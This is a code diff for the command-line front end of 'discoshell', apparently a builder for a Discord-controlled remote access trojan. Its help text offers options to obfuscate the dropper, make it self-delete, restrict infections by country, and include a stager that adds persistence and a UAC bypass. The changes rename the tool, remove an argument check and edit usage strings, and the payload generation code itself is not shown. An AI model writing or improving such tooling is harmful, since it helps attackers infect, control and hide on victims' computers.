@@ -1,4 +1,6 @@
-﻿namespace discosh
+﻿using System.Diagnostics;
+
+namespace discoshell
 {
     internal class Program
     {
@@ -40,13 +42,6 @@
                 Console.ResetColor();
                 Environment.Exit(1);
             }
-            if (_prefix == string.Empty)
-            {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("Insufficient arguments: No Discord bot command prefix specified.");
-                Console.ResetColor();
-                Environment.Exit(1);
-            }
 
             byte[] result = PGen.Generate(_token, _prefix, _obf, _delself, _geolock, _ponly);
             Console.WriteLine($"Writing output to: {_output}");
@@ -76,7 +71,7 @@
             Console.ForegroundColor = ConsoleColor.White;
             Console.Write("Usage:");
             Console.ForegroundColor = ConsoleColor.Gray;
-            Console.Write(" discosh [-h|--help] [-o|--output] [-t|--token] [-p|--prefix] [-obf|--obfuscate] [-d|--deleteself] [-gl|--geolock] [-po|payloadonly]\n\n");
+            Console.Write($" {Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName)} [-h|--help] [-o|--output] [-t|--token] [-p|--prefix] [-obf|--obfuscate] [-d|--deleteself] [-gl|--geolock] [-po|payloadonly]\n\n");
 
             Console.ForegroundColor = ConsoleColor.White;
             Console.WriteLine("Arguments:");
@@ -87,7 +82,7 @@
             Console.WriteLine("--prefix        Set Discord bot command prefix");
             Console.WriteLine("--obfuscate     Obfuscate dropper");
             Console.WriteLine("--deleteself    Make dropper delete itself");
-            Console.WriteLine("--geolock       Make RAT only infect machines in specified countries. To specify multiple countries, seperate each country name with a comma (no spaces)");
+            Console.WriteLine("--geolock       Make RAT only infect machines in specified countries. To specify multiple countries, seperate each country name with a comma.");
             Console.WriteLine("--payloadonly   Generate RAT payload only without stager (no persistence and no UAC bypass)");
             Console.WriteLine();
             Console.ForegroundColor = oldc;
